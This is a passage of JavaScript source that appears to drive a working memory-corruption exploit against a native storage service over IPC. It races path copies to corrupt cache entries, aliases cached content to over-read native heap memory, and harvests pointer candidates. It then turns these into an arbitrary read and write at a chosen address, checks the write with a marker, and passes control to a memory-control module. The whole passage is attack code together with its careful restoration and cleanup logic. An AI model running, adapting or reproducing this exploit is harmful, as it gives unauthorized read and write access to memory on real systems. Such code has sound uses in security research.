            throw Error('Repeated overwrite missed the canary; retain resources for recovery');
          }
          await checkExtent();
        }
        if (addressPlan && report.markerReproduced) {
          const encoded = await retryWave('address-encoding-control');
          report.cacheAddress.encodingControl = {copied: hasWindow(encoded) && encoded.canaryType === 0,
            result: encoded.rows.find(row => row.role === 'trigger').result};
          check(report.cacheAddress.encodingControl.copied, 'The encoded pointer prefix did not reach the native marker');
          await checkExtent();
        }
        if ((report.markerReproduced)) {
          const aliasOffset = (0x1400000);
          const leakOffset = (aliasOffset);
          const cache = report.cacheAlias = {targetOffset: markerOffset, clean: true, outputPoison: 0xa5, aliasOffset};
          const hash = bytes => crypto.createHash('sha256').update(bytes).digest('hex');
          async function readStorage(handle, size, offset = 0, poison = cache.outputPoison) {
            // Distinguish a real copy from a successful call that leaves the
            // receive buffer untouched after a malformed cache lookup.
            await s.call('memset', output, poison, size);
            const reply = await s.ipc('Read candidate content', handle, 0, Buffer.concat([u64(offset), u64(size)]),
              {receive: [{address: output, size, mode: 1}]});
            if (reply.result) return {result: reply.canonicalResult, bytes: null};
            const bytes = size >= 0x8000 ? await bulk.read(s, output, size) : await s.readOwned(output, size);
            return {result: reply.canonicalResult, bytes};
          }
          const controlSize = Math.max(0x8000, cacheReadSize);
          const control = await readStorage(storage, controlSize);
          check(!control.result, 'Cache-range content control failed');
          cache.controlFile = path.join(__dirname, label + '-range-control.bin');
          await fs.writeFile(cache.controlFile, control.bytes, {mode: 0o600});
          cache.controlSha256 = hash(control.bytes);
          const aliasControl = await readStorage(storage, 16, aliasOffset);
          check(!aliasControl.result && !aliasControl.bytes.equals(control.bytes.subarray(0, 16)),
            'Alias control does not distinguish the two offsets');
          cache.aliasControlHex = aliasControl.bytes.toString('hex');
          cache.expectedAliasHex = control.bytes.subarray(0, 16).toString('hex');
          await reserveGroup();
          const beforeCandidate = await memory();
          candidateHandle = domain.oneHandle(await s.ipc('Reuse the canary slot with own content', root, 200));
          const prime = await readStorage(candidateHandle, 16);
          check(!prime.result && prime.bytes.equals(control.bytes.subarray(0, 16)), 'Candidate content differs');
          const afterCandidate = await memory();
          cache.allocationBytes = beforeCandidate[5] - afterCandidate[5];
          group.before[5] -= cache.allocationBytes;
          group.held[5] -= cache.allocationBytes;
          check(cache.allocationBytes === 13616, 'Candidate allocation cost differs');
          await save();

          const ownerControls = [];
          async function copyField(tail, name, requiredCopies = fieldCopies) {
            check(Number.isInteger(requiredCopies) && requiredCopies >= 1 && requiredCopies <= fieldCopies,
              'Invalid number of field-copy controls');
            const bytes = Buffer.alloc(markerOffset + tail.length + 1, 'B');
            bytes.write('/..\\');
            tail.copy(bytes, markerOffset);
            bytes[bytes.length - 1] = 0;
            for (let batch = 0; batch < 3; batch++) {
              let confirmed = 0, attempts = 0, bestMargin = -Infinity, aborted = 0, misses = 0;
              const guards = {completed: 0, earlyHole: 0, minimumSpacing: 0};
              for (let attempt = 0; attempt < requiredCopies * 20 && confirmed < requiredCopies; attempt++) {
                const row = await wave('cache-' + name + '-' + batch + '-' + attempt, qualified, bytes);
                attempts++;
                if (Number.isFinite(row.receiveOrderMarginUs)) bestMargin = Math.max(bestMargin, row.receiveOrderMarginUs);
                if (row.triggerAborted) {
                  aborted++;
                  for (const key of Object.keys(guards)) if (row.nativeGuard?.[key]) guards[key]++;
                }
                if (row.changedPaths.length) misses++;
                // Every retry writes the same prefix. An aborted copy or a
                // known path-canary miss is not evidence against an earlier
                // accepted window. Count accepted windows without requiring
                // consecutive placement; native readback remains the proof.
                const accepted = hasWindow(row) && row.preReleaseUsed >= minimumCacheHeld && row.changedPaths.length === 0;
                if (accepted) confirmed++;
              }
              if (confirmed === requiredCopies) break;
              check(runControl.state.mode !== 'retiring', 'Cleanup field copies did not retain the required receive order');
              if (batch < 2) {
                console.log(JSON.stringify({stage: 'field-copy-retry', name, batch, confirmed,
                  required: requiredCopies, attempts}));
                continue;
              }
              throw Error('Field copy did not qualify within its attempt limit: ' + name +
                ' [batch ' + batch + ', accepted ' + confirmed + '/' + requiredCopies +
                ', attempts ' + attempts + ', best margin ' +
                (Number.isFinite(bestMargin) ? bestMargin.toFixed(0) : 'none') + ' us (needs 300)' +
                ', native aborts ' + aborted + ' [completed ' + guards.completed +
                ', earlyHole ' + guards.earlyHole + ', minimumSpacing ' + guards.minimumSpacing + ']' +
                ', canary misses ' + misses + ']');
            }
          }
          async function setAliasOffset(name) {
            const steps = canonicalPlanner.nulWrites(u64(aliasOffset));
            for (const step of steps) await copyField(step.bytes, name + '-' + step.end);
          }
          async function installCombinedLeak(name) {
            check(aliasOffset + cacheReadSize <= Number(storageSize), 'Combined read exceeds storage size');
            const prefix = Buffer.alloc(0x12);
            prefix.writeBigUInt64LE(BigInt(aliasOffset));
            prefix.writeBigUInt64LE(0x4141414141414141n, 8);
            prefix[0x10] = 1;
            // The last NUL leaves dirty=0 and preserves the genuine handle.
            const steps = canonicalPlanner.nulWrites(prefix);
            check(steps.length === 7, 'Combined prefix needs exactly seven copies');
            cache.combinedPrefix = prefix.toString('hex');
            for (const step of steps) await copyField(step.bytes, name + '-' + step.end);
          }
          const restoreAlias = async () => {
            {
              // The modified entry is still clean. Invalidation also handles
              // an ordinary-content miss that inserted a new entry.
              const reset = await s.ipc('Reset the clean alias cache', candidateHandle, 5,
                Buffer.concat([u64(2), u64(0), u64(storageSize)]));
              (cache.invalidateResults ||= []).push(reset.canonicalResult);
              await save();
              check(!reset.result, 'Clean alias cache invalidation failed');
            }
            const restored = await readStorage(candidateHandle, 16);
            cache.restoredPrefix = !restored.result && restored.bytes.equals(prime.bytes);
            (cache.restoreChecks ||= []).push({result: restored.result,
              observedHex: restored.bytes?.toString('hex'), matches: cache.restoredPrefix});
            await save();
            check(cache.restoredPrefix, 'Candidate prefix changed after restoration');
            cacheNeedsRestore = false;
            cache.restored = true;
            await save();
          };
          restoreCandidate = restoreAlias;
          cache.attempts = [];
          for (let attempt = 0; ; attempt++) {
            if (attempt && attempt % metadataAttempts === 0) {
              throw Error('Clean alias did not qualify within its attempt limit');
            }
            cacheNeedsRestore = true;
            await save();
            await installCombinedLeak('combined-leak-' + attempt);
            const aliased = await readStorage(candidateHandle, 16, aliasOffset);
            cache.readResult = aliased.result;
            cache.selectedAlias = cache.normalContent = false;
            cache.outputFile = cache.outputSha256 = cache.observedHex = null;
            if (aliased.bytes) {
              cache.outputFile = path.join(__dirname, label + '-alias-output-' + attempt + '.bin');
              await fs.writeFile(cache.outputFile, aliased.bytes, {mode: 0o600});
              cache.outputSha256 = hash(aliased.bytes);
              cache.observedHex = aliased.bytes.toString('hex');
              cache.selectedAlias = aliased.bytes.equals(prime.bytes);
              cache.normalContent = aliased.bytes.equals(aliasControl.bytes);
            }
            cache.attempts.push({attempt, result: aliased.result, observedHex: aliased.bytes?.toString('hex'),
              selectedAlias: cache.selectedAlias, normalContent: cache.normalContent,
              outputFile: aliased.bytes ? cache.outputFile : null});
            await save();
            // Keep this exact entry and buffer for the extended read. An
            // ordinary-content miss still takes the existing restore path.
            if ((!cache.selectedAlias)) await restoreCandidate();
            // Retry only a clean ordinary-content miss, after invalidation
            // and the original-prefix check. Keep the same owned array alive.
            if (cache.selectedAlias || !cache.normalContent) break;
          }
          check((cache.selectedAlias), 'Combined acquisition did not obtain the clean alias');
          if ((cache.selectedAlias)) {
            const range = report.cacheRange = {targetOffset: markerOffset, referenceRange: 0x4000,
              trialRange, readSize: cacheReadSize, readOffset: leakOffset,
              logicalRange: ('0x4141414141414141'),
              clean: true, outputPoison: cache.outputPoison};
            // Keep this entry clean: its original allocation size is not yet
            // read from native memory, so no content Flush is appropriate.
            restoreCandidate = async () => {
              {
                const invalidated = await s.ipc('Invalidate the widened clean cache', candidateHandle, 5,
                  Buffer.concat([u64(2), u64(0), u64(storageSize)]));
                range.invalidateResult = invalidated.canonicalResult;
                check(!invalidated.result, 'Widened cache invalidation failed');
                const restored = await readStorage(candidateHandle, controlSize);
                range.restoredContent = !restored.result && restored.bytes.equals(control.bytes);
                check(range.restoredContent, 'Content differs after widened cache invalidation');
                range.invalidated = true;
              }
              cacheNeedsRestore = false;
              await save();
            };
            cacheNeedsRestore = true;
            await save();
            {
              range.attempts = [];
              for (let attempt = 0; ; attempt++) {
                if (attempt && attempt % metadataAttempts === 0) {
                  throw Error('Clean range did not qualify within its attempt limit');
                }
                cacheNeedsRestore = true;
                await save();
                {
                  if (attempt) await installCombinedLeak('combined-expand-retry-' + attempt);
                }
                const beforeRelease = await readStorage(candidateHandle, cacheReadSize, leakOffset);
                range.beforeReleaseResult = beforeRelease.result;
                range.beforeReleasePrefixMatches = false;
                range.beforeReleaseFirstDifference = null;
                range.beforeReleaseFile = range.beforeReleaseSha256 = null;
                if (beforeRelease.bytes) {
                  range.beforeReleasePrefixMatches = beforeRelease.bytes.subarray(0, 0x4000).equals(control.bytes.subarray(0, 0x4000));
                  range.beforeReleaseFirstDifference = beforeRelease.bytes.findIndex((byte, i) => byte !== control.bytes[i]);
                  range.beforeReleaseFile = path.join(__dirname, label + '-before-release-' + attempt + '.bin');
                  await fs.writeFile(range.beforeReleaseFile, beforeRelease.bytes, {mode: 0o600});
                  range.beforeReleaseSha256 = hash(beforeRelease.bytes);
                }
                range.attempts.push({attempt, result: beforeRelease.result,
                  prefixMatches: range.beforeReleasePrefixMatches, firstDifference: range.beforeReleaseFirstDifference,
                  outputFile: beforeRelease.bytes ? range.beforeReleaseFile : null,
                  sha256: beforeRelease.bytes ? range.beforeReleaseSha256 : null});
                await save();
                // Adjacent cached blocks can match ordinary content too.
                // Require a matching first block and a later real difference;
                // do not require that difference at exactly byte 0x4000.
                if (!beforeRelease.result && range.beforeReleasePrefixMatches && range.beforeReleaseFirstDifference >= 0x4000) break;
                check(!beforeRelease.result && range.beforeReleaseFirstDifference === -1,
                  'Neighbor-release control is not a qualified over-read');
                await restoreAlias();
              }
              const releasedCaches = range.releasedCaches = {before: await memory(), results: []};
              // These owners are all read-only content storages. Their cache
              // buffers can be freed without closing any app-owned object.
              for (const handle of new Set([storage, pinHandle, ...storages, originalRom].filter(Boolean))) {
                check(handle !== candidateHandle, 'Cannot invalidate the active leak owner');
                const reply = await s.ipc('Release neighboring clean content cache', handle, 5,
                  Buffer.concat([u64(2), u64(0), u64(storageSize)]));
                releasedCaches.results.push({handle, result: reply.canonicalResult});
                await save();
                check(!reply.result, 'Neighboring clean cache invalidation failed');
              }
              releasedCaches.after = await memory();
              releasedCaches.delta = releasedCaches.after.map((value, i) => value - releasedCaches.before[i]);
              await save();
              check(releasedCaches.delta[5] === 0, 'Neighbor invalidation changed general-heap geometry');
            }
            const widened = await readStorage(candidateHandle, cacheReadSize, leakOffset);
            range.readResult = widened.result;
            if (widened.bytes) {
              range.outputFile = path.join(__dirname, label + '-range-output.bin');
              await fs.writeFile(range.outputFile, widened.bytes, {mode: 0o600});
              range.outputSha256 = hash(widened.bytes);
              range.firstDifference = widened.bytes.findIndex((byte, i) => byte !== control.bytes[i]);
              range.prefixMatches = widened.bytes.subarray(0, 0x4000).equals(control.bytes.subarray(0, 0x4000));
            }
            await save();
            if ((widened.bytes) && range.prefixMatches && range.firstDifference >= 0x4000) {
              range.earlyLinkCandidates = await nativeLinks(range);
              range.fragmentationSkipped = range.earlyLinkCandidates.some(item =>
                item.encodable && (item.changedLink || item.zeroTail || item.zeroAfter32));
              await save();
            }
            if (!range.fragmentationSkipped && (16) &&
                widened.bytes && range.prefixMatches && range.firstDifference >= 0x4000) {
              range.fragmentation = [];
              async function snapshot(name, invalidation = null) {
                const read = await readStorage(candidateHandle, cacheReadSize, leakOffset);
                check(!read.result, 'Fragmentation snapshot failed');
                const outputFile = path.join(__dirname, label + '-' + name + '.bin');
                await fs.writeFile(outputFile, read.bytes, {mode: 0o600});
                const item = {name, outputFile, outputSha256: hash(read.bytes), invalidation,
                  firstDifference: read.bytes.findIndex((byte, i) => byte !== control.bytes[i]),
                  prefixMatches: read.bytes.subarray(0, 0x4000).equals(control.bytes.subarray(0, 0x4000)),
                  memory: await memory()};
                range.fragmentation.push(item);
                await save();
                check(item.prefixMatches && item.firstDifference >= 0x4000,
                  'The widened candidate was replaced during fragmentation');
              }
              // Existing storage objects keep general-heap geometry fixed.
              // Alternate allocations, then invalidate each clean owner.
              const neighbors = ([pinHandle, storages[0]]);
              const blocks = (fragmentCount);
              for (let i = 0; i < blocks; i++) for (const handle of neighbors) {
                const read = await readStorage(handle, 16, i * 0x4000);
                check(!read.result && read.bytes.equals(control.bytes.subarray(i * 0x4000, i * 0x4000 + 16)),
                  'Neighbor content differs');
                const keep = await readStorage(candidateHandle, 16, leakOffset);
                check(!keep.result && keep.bytes.equals(prime.bytes), 'Candidate prefix changed while priming neighbors');
              }
              await snapshot('fragment-primed');
              for (let parity = 0; parity < 2; parity++) {
                const freed = [];
                for (let index = parity; index < neighbors.length; index += 2) {
                  const handle = neighbors[index];
                  const invalidated = await s.ipc('Invalidate clean neighboring cache ' + index, handle, 5,
                    Buffer.concat([u64(2), u64(0), u64(storageSize)]));
                  check(!invalidated.result, 'Neighbor cache invalidation failed');
                  freed.push(handle);
                }
                await snapshot('fragment-free-' + parity, {handles: freed, operation: 2, result: 0});
              }
            }
            await restoreCandidate();
            range.completed = true;
          }
          if ((cache.selectedAlias)) {
            const range = report.cacheRange;
            check(range?.completed && range.readResult === 0 && range.prefixMatches && range.firstDifference >= 0x4000,
              'Combined acquisition needs a qualified native over-read');
            const candidates = await nativeLinks(range);
            report.linkCandidates = candidates;
            await save();
            const selected = candidates.find(item => item.encodable);
            check(selected, 'The bounded native leak contains no qualified, encodable link candidate');
            const evidence = {session: live.session, target: '0x' + selected.target.toString(16),
              sourceFile: selected.sourceFile, sourceOffset: selected.offset, sourceSha256: selected.sourceSha256,
              sourceReport: file,
              qualification: selected.changedLink ?
                'Native clean-cache over-read; controlled cache allocation/release changed only the first word of this aligned block into an address candidate. Absolute address not yet verified.' :
                selected.zeroTail ? 'Native clean-cache over-read; aligned candidate followed by 56 zero bytes. Absolute address not yet verified.' :
                selected.zeroAfter32 ? 'Native clean-cache over-read; aligned candidate followed by up to 24 stale bytes and 16352 zero bytes. Absolute address not yet verified.' :
                'Native pre-release block-head candidate; the entire block changed after release. This is weaker evidence than a link-only change and the address still requires native verification.'};
            const evidenceFile = path.join(__dirname, label + '-native-link-candidate.json');
            await fs.writeFile(evidenceFile, JSON.stringify(evidence, null, 2) + '\n', {mode: 0o600});
            await prepareAddressControl(evidence, evidenceFile);

            // A short input exercises native UTF-8 validation without an
            // overflow. Requalify the owned cache after these ordinary calls.
            const prefix = Buffer.from('/..\\');
            const invalid = await raw(saved, 7, Buffer.concat([prefix, Buffer.from([0xff, 0])]));
            const encodedBytes = Buffer.concat([prefix, addressPlan.writes[0].bytes, Buffer.from([0])]);
            const encoded = await raw(saved, 7, encodedBytes);
            const inputMatches = (await s.readOwned(b + 0x4000, encodedBytes.length)).equals(encodedBytes);
            report.cacheAddress.encodingControl = {kind: 'bounded-native-normalizer',
              invalidResult: invalid.canonicalResult, acceptedResult: encoded.canonicalResult, inputMatches,
              accepted: invalid.canonicalResult === 0x2eea02 && encoded.canonicalResult === 0x2eec02 && inputMatches};
            await save();
            check(report.cacheAddress.encodingControl.accepted, 'Native pointer encoding control failed');

            const reprime = await readStorage(candidateHandle, 16);
            check(!reprime.result && reprime.bytes.equals(prime.bytes), 'Candidate prefix differs before requalification');
            restoreCandidate = restoreAlias;
            cacheNeedsRestore = true;
            await save();
            await setAliasOffset('address-alias-offset');
            const selectedAgain = await readStorage(candidateHandle, 16, aliasOffset);
            report.cacheAddress.aliasRequalification = {result: selectedAgain.result,
              observedHex: selectedAgain.bytes?.toString('hex'),
              selected: !selectedAgain.result && selectedAgain.bytes.equals(prime.bytes)};
            await save();
            await restoreCandidate();
            check(report.cacheAddress.aliasRequalification.selected, 'The owned cache alias did not survive address preparation');
          }
          if ((cache.selectedAlias) && report.cacheAddress.periodControlHex !== prime.bytes.toString('hex')) {
            cacheNeedsRestore = true;
            await save();
            await copyField(Buffer.from([0xc2, 0x80, 0x02]), 'period-offset-3');
            await copyField(Buffer.alloc(0), 'period-offset-0');
            const period = await readStorage(candidateHandle, 16, 0x28000);
            report.cacheAddress.periodAlias = {result: period.result, actualHex: period.bytes?.toString('hex'),
              selectedAlias: !period.result && period.bytes.equals(prime.bytes)};
            if (report.cacheAddress.periodAlias.selectedAlias) report.cacheAddress.bucketPeriod = 0x28000;
            await restoreCandidate();
          }
          if (addressPlan && cache.selectedAlias) {
            check(addressPlan.cycle === 0x500000 || report.cacheAddress.bucketPeriod === addressPlan.cycle,
              'The planned bucket period did not qualify on this candidate');
            const address = report.cacheAddress, length = 0x4000, writeOffset = 0x108;
            check(addressPlan.target % 0x4000 === 0 && addressPlan.readOffset + length <= Number(storageSize),
              'The native address control needs a complete aligned buffer block');
            const ordinary = {bytes: await fs.readFile(address.controlFile)};
            let original, memoryNeedsRestore = false, memoryContext;
            async function writeWindow(bytes) {
              const input = b + 0xb0000;
              await put(input, bytes);
              const reply = await s.ipc('Write the selected memory window', candidateHandle, 1,
                Buffer.concat([u64(addressPlan.readOffset + writeOffset), u64(bytes.length)]),
                {send: [{address: input, size: bytes.length, mode: 1}]});
              return reply.canonicalResult;
            }
            async function restoreMemory() {
              if (!memoryNeedsRestore) return;
              address.restoreWriteResult = await writeWindow(original.subarray(writeOffset, writeOffset + 16));
              check(!address.restoreWriteResult, 'Selected memory restoration write failed');
              const restored = await readStorage(candidateHandle, length, addressPlan.readOffset);
              address.restoreReadResult = restored.result;
              if (restored.bytes) {
                address.restoreOutputFile = path.join(__dirname, label + '-address-restored.bin');
                await fs.writeFile(address.restoreOutputFile, restored.bytes, {mode: 0o600});
                address.restoreSha256 = hash(restored.bytes);
              }
              address.memoryRestored = !restored.result && restored.bytes.equals(original);
              await save();
              check(address.memoryRestored, 'Selected memory differs after restoration');
              memoryNeedsRestore = false;
              await save();
            }
            // Never flush or invalidate a redirected dirty entry. Clearing
            // its valid byte makes finalization skip the synthetic pointer.
            restoreCandidate = async () => {
              if (report.retainedMemory?.promoted) {
                check(memoryContext, 'Retained memory context is unavailable');
                await require("../retained/retained-memory.cjs").retire(memoryContext);
                address.retired = true;
                cacheNeedsRestore = false;
                await save();
                return;
              }
              await restoreMemory();
              await copyField(Buffer.alloc(0x10, 'B'), 'retire-address-entry');
              address.retired = true;
              cacheNeedsRestore = false;
              await save();
            };
            cacheNeedsRestore = true;
            await save();
            for (const step of addressPlan.writes) await copyField(step.bytes, 'address-header-' + step.end);
            const first = await readStorage(candidateHandle, length, addressPlan.readOffset, 0xa5);
            const second = await readStorage(candidateHandle, length, addressPlan.readOffset, 0x5a);
            address.readResults = [first.result, second.result];
            if (second.bytes) {
              address.repeatOutputFile = path.join(__dirname, label + '-address-output-repeat.bin');
              await fs.writeFile(address.repeatOutputFile, second.bytes, {mode: 0o600});
              address.repeatSha256 = hash(second.bytes);
            }
            if (first.bytes) {
              address.outputFile = path.join(__dirname, label + '-address-output.bin');
              await fs.writeFile(address.outputFile, first.bytes, {mode: 0o600});
              address.outputSha256 = hash(first.bytes);
              address.repeatMatches = second.bytes?.equals(first.bytes) || false;
              address.differsFromContent = !first.bytes.equals(ordinary.bytes);
              address.first64Hex = first.bytes.subarray(0, 64).toString('hex');
            }
            address.readVerified = !first.result && !second.result && address.repeatMatches && address.differsFromContent;
            await save();
            check(address.readVerified, 'The native address read did not pass both poison and content controls');
            {
              original = first.bytes;
              const marker = Buffer.from('46532d52572d323600ff11223344aa55', 'hex');
              check(marker.length === 16, 'The write marker must cover exactly sixteen bytes');
              const expected = Buffer.from(original);
              marker.copy(expected, writeOffset);
              memoryNeedsRestore = true;
              address.writeAddress = addressPlan.target + writeOffset;
              address.writeMarker = marker.toString('hex');
              await save();
              address.writeResult = await writeWindow(marker);
              check(!address.writeResult, 'Selected memory write failed');
              const changed = await readStorage(candidateHandle, length, addressPlan.readOffset);
              address.writeVerified = !changed.result && changed.bytes.equals(expected);
              if (changed.bytes) {
                address.writeOutputFile = path.join(__dirname, label + '-address-write-output.bin');
                await fs.writeFile(address.writeOutputFile, changed.bytes, {mode: 0o600});
                address.writeOutputSha256 = hash(changed.bytes);
              }
              await save();
              check(address.writeVerified, 'Selected memory write or neighboring bytes differ');
              await restoreMemory();
              address.savedProof = await require('./verify-proof.cjs').verifyProof(file, live.session);
              await save();
            }
            {
              const controller = require("./fs-memory-control.cjs");
              await fs.copyFile(path.join(__dirname, 'fs-memory-control.cjs'),
                path.join(__dirname, label + '-memory-control-source.cjs'));
              memoryContext = {s, live, report, file, label, save, storageSize: Number(storageSize),
                initialPlan: addressPlan, copyField, readStorage, candidateHandle, input: b + 0xb0000, put,
                runControl};
              await controller.serve(memoryContext);
            }
            await restoreCandidate();
            address.completed = true;
          }
          await s.close(candidateHandle);
          candidateHandle = null;
          const fresh = domain.oneHandle(await s.ipc('Verify content with a fresh storage', root, 200));
          const verified = await readStorage(fresh, controlSize);
          cache.backingUnchanged = !verified.result && verified.bytes.equals(control.bytes);
          const verifiedAlias = await readStorage(fresh, 16, aliasOffset);
          cache.backingUnchanged &&= !verifiedAlias.result && verifiedAlias.bytes.equals(aliasControl.bytes);
          if (addressPlan && report.cacheAddress.completed) {
            const original = await fs.readFile(report.cacheAddress.controlFile);
            const verifiedAddress = await readStorage(fresh, original.length, addressPlan.readOffset);
            report.cacheAddress.backingUnchanged = !verifiedAddress.result && verifiedAddress.bytes.equals(original);
            cache.backingUnchanged &&= report.cacheAddress.backingUnchanged;
          }
          check(cache.backingUnchanged, 'Fresh content differs after cache restoration');
          await s.close(fresh);
          cache.completed = true;
        }
      } else report.skipped = 'Negative control did not retain all paths in the required order';
    }
    report.completed = true;
  } catch (error) {
    if (error instanceof StopRequested) report.stopped = true;
    else {
      report.error = error.stack;
      process.exitCode = 1;
      if (runControl.started && await s.ready()) {
        if (s.threads.size && workers.length) {
          try {
            const capture = await require("./capture-workers.cjs").captureWorkers(s, workers);
            report.workerCaptureFile = path.join(__dirname, label + '-worker-failure.json');
            await fs.writeFile(report.workerCaptureFile, JSON.stringify(capture, null, 2) + '\n', {mode: 0o600});
          } catch (captureError) {report.workerCaptureError = captureError.stack;}
          await save();
        }
        console.log(JSON.stringify({stage: ('bounded-failure'), file, error: error.message}));
      }
    }
  }
  finally {
    try { if (typeof runControl?.retire === 'function') runControl.retire(); } catch {}
    try {
      if (!released && s.threads.size && await s.ready()) {
        const parked = workers.filter(worker => !worker.joined && s.threads.has(worker.thread));
        for (const worker of parked) await s.rpc.store64(worker.base + worker.tablesOffset +
          worker.logicalResultIndices[1] * 0x100 + 0x78, BigInt(live.sdk + code.exit.offset));
        for (const gate of gates) await events.signal(s, gate);
        for (const worker of parked) {
          const until = Date.now() + 5000;
          while (!await s.rpc.call3(live.sdk + code.tryWait.offset, worker.thread, 0, 0))
            check(Date.now() < until, 'Cancelled gap worker remains pending');
          check(!await s.rpc.call3(live.sdk + code.join.offset, worker.thread, worker.slot + 8, 0), 'Cancellation join failed');
          s.threads.delete(worker.thread);
          worker.joined = true;
        }
        report.setupCancelled = true;
      }
      if (!report.placementUncertain && !s.threads.size && cacheNeedsRestore && restoreCandidate && await s.ready()) {
        try {await restoreCandidate();}
        catch (error) {report.cacheRestoreError = error.stack; process.exitCode = 1;}
      }
      if (!report.placementUncertain && !s.threads.size && !cacheNeedsRestore && await s.ready()) {
        if (fileHandle && s.handles.has(fileHandle)) await s.close(fileHandle);
        await closeGroup();
        for (const item of [...created].reverse()) {
          check(!(await normal(item.handle, 4, item.path)).result, 'Gap scratch removal failed');
          check(!(await s.ipc('Commit gap scratch removal', item.handle, 10)).result, 'Gap cleanup commit failed');
          check((await normal(item.handle, 7, item.path)).canonicalResult === 0x202, 'Gap scratch remains');
          created.splice(created.indexOf(item), 1);
        }
        for (const gate of gates) await events.finalize(s, gate);
        await s.cleanup();
      }
    } catch (error) {report.cleanupError = error.stack; process.exitCode = 1;}
    await s.closeUpload();
    report.cleanedUp = !s.base && !s.handles.size && !s.threads.size && !created.length && !group;
    report.finished = new Date().toISOString();
    await runControl.close();
    await save();
    console.log(JSON.stringify({file, completed: report.completed, cleanedUp: report.cleanedUp,
      qualifiedReadSize: report.qualifiedReadSize, error: report.error, cleanupError: report.cleanupError}));
  }
}

main().catch(error => {console.error(error.stack); process.exitCode = 1;});
